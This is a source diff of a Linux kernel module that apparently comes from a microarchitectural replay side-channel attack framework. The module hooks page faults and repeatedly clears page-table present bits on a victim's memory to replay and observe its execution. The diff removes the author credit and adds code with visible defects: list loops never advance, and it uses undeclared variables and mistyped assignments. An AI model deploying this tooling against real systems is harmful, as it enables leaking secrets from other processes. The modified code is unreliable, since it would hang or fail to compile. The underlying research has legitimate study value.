@@ -1,14 +1,7 @@
 /*
- * Author: Dimitrios Skarlatos
- * Contact: skarlat2@illinois.edu - http://skarlat2.web.engr.illinois.edu/
- *
- * nuke_mod.c is a kernel module that facilitates as the interface to
- * the victim application and as an orchestration between the page fault handler
- * the nuke of the page tables.
- * 
  * This version uses the following kernel features:
- *      1. Ioctl
- *      2. Kprobes
+ *      1. Ioctl to communicate with userspace
+ *      2. Kprobes to add code to the pf handler
  */
 
 #include <asm/cacheflush.h>
@@ -41,6 +34,7 @@
 #include <linux/swapops.h>
 #include <linux/syscalls.h>
 #include <linux/timer.h>
+#include <linux/atomic.h>
 
 #include "nuke_mod.h"
 #include "util.h"
@@ -56,21 +50,20 @@ static int Device_Open = 0;
 // NOTE: notify_attack is actually a function we added to the 
 // kernel and that is why microscope requires a custom kernel.
 static struct kprobe kp = {
-	.symbol_name = "notify_attack",
+	.symbol_name = "check_attack",
 };
 
 // Microscope variables
-#define RETRIES 2000000 // Number of computations we want to monitor
-#define MAX_NUKES 2		// Maximum number of addresses to nuke (2 in of the AES attack, 1 in the port contention attack)
-struct attack_info the_info[MAX_NUKES];
-struct attack_info *ptr_info;
 extern pte_t *fault_pte;
-static uint32_t nuked_cnt = 0, monitored_cnt = 0;
-static uint64_t fault_cnt = 0, fault_fault_cnt = 0;
+static uint64_t fault_fault_cnt = 0;
 
-// Variables used when we have monitors in the kernel (e.g. AES attack)
-static uint32_t pf_switch = 0;
-static uint32_t switches = 0;
+// APA variables
+static struct nuke_info_t *nuke_info_head = NULL;
+static uint8_t monitoring = 0, done = 0;
+static atomic_t fault_cnt = ATOMIC_INIT(1);
+
+//region IOCTL Functions
+//---------------------------------------------------------------------------------------
 
 /*
  * device_open is invoked when the victim connects to the char device.
@@ -120,31 +113,27 @@ static ssize_t device_write(struct file *file, const char __user *buffer, size_t
 
 	// Identify the requested ioctl call
 	switch (type) {
-	case NUKE_ADDR:
-		if (nuked_cnt >= MAX_NUKES) {
-			pr_warning("Nuke_mod: Cannot nuke more than %d addresses at the same time.", MAX_NUKES);
-		} else {
-            pr_info("Setting up nuke id %u -> addr %p\n", nuked_cnt, (void *)address);
-            setup_nuke_structs(&ptr_info[nuked_cnt], address);
-            nuked_cnt++;
-        }
+	case APPEND_ADDR:
+		pr_info("Storing addr %p\n", (void *)address);
+        store_nuked_address(&nuke_info_head, address);
         break;
-	case MONITOR_ADDR:
-		pr_info("Setting up monitor id %u -> addr %p\n", monitored_cnt, (void *)address);
-		// NOTE: We store all the monitor addresses in ptr_info[0], regardless of how many nuked addresses we have
-		setup_monitor_structs(&ptr_info[0], address, monitored_cnt);
-		monitored_cnt++;
+		
+	case START_MONITORING:
+		pr_info("On the lookout for page faults of the stored addresses");
+		monitoring = 1;
 		break;
-	case PF:
-		pr_info("Preparing the page fault for the nuked address\n");
-		pf_prep(&ptr_info[0], ptr_info[0].nuke_addr, monitored_cnt);
-		fault_cnt = 0;
-		fault_fault_cnt = 0;
+
+	case STOP_MONITORING:
+		pr_info("Attack complete: I will forget everything you told me down here");
+		monitoring = 0;
+		clean_up_stored_addresses(&nuke_info_head);
 		break;
-    case LONG_LATENCY:
-		// pr_info("Making the load long latency for the nuked address\n");
-		cause_long_latency(&ptr_info[0], ptr_info[0].nuke_addr);
+
+	case WAIT:
+		pr_info("Waiting for magic batch to happen on thread 0");
+		while (done != 1) {;;}
 		break;
+
 	default:
 		break;
 	}
@@ -160,7 +149,7 @@ static ssize_t device_write(struct file *file, const char __user *buffer, size_t
  * MONITOR_ADDR - Pass the base monitor address (e.g. the AES Td tables), we will search for the actual one
  * PREP_PF - Set up the replay mechanism through page faults.
  */
-long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl_param)
+static long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl_param)
 {
 	int i = 0;
 	char *temp;
@@ -174,20 +163,17 @@ long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl
 	}
 
 	switch (ioctl_num) {
-	case IOCTL_SET_MSG:
-		device_write(file, (char *)ioctl_param, i, 0, MSG);
+	case IOCTL_APPEND_ADDR:
+		device_write(file, (char *)ioctl_param, i, 0, APPEND_ADDR);
 		break;
-	case IOCTL_SET_NUKE_ADDR:
-		device_write(file, (char *)ioctl_param, i, 0, NUKE_ADDR);
+	case IOCTL_START_MONITORING:
+		device_write(file, (char *)ioctl_param, i, 0, START_MONITORING);
 		break;
-	case IOCTL_SET_MONITOR_ADDR:
-		device_write(file, (char *)ioctl_param, i, 0, MONITOR_ADDR);
+	case IOCTL_STOP_MONITORING:
+		device_write(file, (char *)ioctl_param, i, 0, STOP_MONITORING);
 		break;
-	case IOCTL_PREP_PF:
-		device_write(file, (char *)ioctl_param, i, 0, PF);
-		break;
-	case IOCTL_LONG_LATENCY:
-		device_write(file, (char *)ioctl_param, i, 0, LONG_LATENCY);
+	case IOCTL_WAIT:
+		device_write(file, (char *)ioctl_param, i, 0, WAIT);
 		break;
 	default:
 		break;
@@ -200,11 +186,14 @@ long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl
  * Ioctl operations struct - defines the supported operations
  * Ioctl code is mainly from: https://linux.die.net/lkmpg/x892.html
  */
-struct file_operations Fops = {
+static struct file_operations Fops = {
 	.unlocked_ioctl = device_ioctl,
 	.open = device_open,
 	.release = device_release,
 };
+
+//---------------------------------------------------------------------------------------
+//endregion
 
 /*
  * handler_fault is invoked in the case of a nested page fault while we were
@@ -213,7 +202,7 @@ struct file_operations Fops = {
  * scenario we stop the attack gracefully. In normal operation fault-on-fault
  * should not be triggered.
  */
-int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
+static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
 {
 	fault_fault_cnt++;
 	pr_info("Nuke_mod: Fult-on-Fault counter %llu, fault counter %llu\n", fault_cnt, fault_fault_cnt);
@@ -236,18 +225,24 @@ int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
  * pre_handler is invoked before the notify_attack (memory.c)
  * we don't have to perform any steps here.
  */
-int pre_handler(struct kprobe *p, struct pt_regs *regs) { return 0; }
+static int pre_handler(struct kprobe *p, struct pt_regs *regs) { return 0; }
 
-/*
- * post_handler is invoked after a notify_attack (memory.c) has finished.
- * At this point we know that a page fault on the replay handle was caused
- * and we proceed with the next steps of the attack.
- * NOTE: this is the simpler code used in the port contention attack, where 
- * the "monitor" is a separate user space process.
- * In the AES attack case, where the monitor is in-kernel, we need a different
- * post_hadler (see poc_v0.3).
- */
-void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
+static int pte_in_list(int v0) {
+	// Loop over list of addresses
+	struct nuke_info_t *current = nuke_info_head;
+	while(current != NULL) {
+
+		// Check if current is the one we want
+		v1 = pte_pfn(*(current->nuke_pte));
+		if (v0 == v1) {
+			return 1;
+		}
+	}
+
+	return 0;
+}
+
+static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
 {
 	uint64_t old_time = 0, wait_time = 0;
 	uint64_t v0 = 0, v1 = 0, access_time = 0;
@@ -255,48 +250,46 @@ void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
 
     // fault_pte is set in the kernel (that's why it's extern here)
 	if (fault_pte) {
-		v0 = pte_pfn(*fault_pte);
-		v1 = pte_pfn(*(ptr_info[0].nuke_ptep)); // in the port contention attack where we only have 1 nuked address
 
-		if (v0 == v1) { // double checking that this is the correct page fault
+		// Note that this does not handle multi-threading
+		if (monitoring == 1) {
 
-			if (fault_cnt == RETRIES) { // we reached the max number of retries we are done with the attack
-				pr_info("Nuke_mod: Reached maximum retries %u\n", RETRIES);
-				if (fault_pte) {
-					*fault_pte = pte_set_flags(*fault_pte, _PAGE_PRESENT);
-					pr_info("Nuke_mod: Resetting present bit %u\n", switches);
+			// Check if the pte of the current page fault is of interest
+			v0 = pte_pfn(*fault_pte);
+			if (pte_in_list(v0) == 1) {
+
+				// Count fault
+				fault_cnt++;
+				pr_info("Page fault count %d", fault_cnt);
+
+				// Ensure the special page page faults at its next access
+				if (fault_cnt == 1) {
+					if (pte_present(*(special->nuke_pte)))
+						special->nuke_pte = pte_clear_flags(*(special->nuke_pte), _PAGE_PRESENT);
+					__flush_tlb_single(special->nuke_virtual_addr);
+				}
+				
+				// Check threshold
+				if (fault_cnt > 24) {
+					monitoring = 0;
+					done = 1;
+					pr_info("Putting thread 0 to sleep and waking up other threads now");
+
+					msleep(3000);
 				}
 
-				set_attack_value(NULL, 0);
-				pr_info("Nuke_mod: Attack is done %u\n. Remove module.", switches);
+			} else if (v0 == pte_pfn(*(special->nuke_pte))) {
+				fault_cnt = 0;
+				pr_info("Page fault count %d", fault_cnt);
 
-			} else if (fault_cnt < RETRIES) { // we are still under the limit of retries: the attack is still underway
-                if (fault_pte) {
-
-                    // Wait some padding time for no reason
-                    // TODO: why is this necessary?
-                    old_time = 0;
-                    wait_time = 0;
-                    while (wait_time < 10000) {
-                        old_time = rdtsc();
-                        wait_time += rdtsc() - old_time;
-                    }
-
-                    // Cause minor page fault again
-                    pf_redo(&ptr_info[0], ptr_info[0].nuke_addr);
-
-                    // Wait some padding time
-                    // TODO: why is this necessary?
-                    old_time = 0;
-                    wait_time = 0;
-                    while (wait_time < 10000) {
-                        old_time = rdtsc();
-                        wait_time += rdtsc() - old_time;
-                    }
-                }
-            }
-
-			fault_cnt++;
+				// Clear stored addresses if present
+				struct nuke_info_t *current = nuke_info_head;
+				while(current != NULL) {
+					if (pte_present(*(current->nuke_pte)))
+						current->nuke_pte = pte_clear_flags(*(current->nuke_pte), _PAGE_PRESENT);
+					__flush_tlb_single(current->nuke_virtual_addr);
+				}
+			}
 		}
 	}
 }
@@ -304,7 +297,7 @@ void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
 /*
  * init_mudule registers the device and the trampoline kprobes code
  */
-int init_module()
+static int init_module()
 {
 	int ret_val;
 
@@ -342,7 +335,7 @@ int init_module()
 /*
  * cleanup_module unregisters the device, the probes, and disables the attack
  */
-void cleanup_module()
+static void cleanup_module()
 {
 	unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
 	unregister_kprobe(&kp);
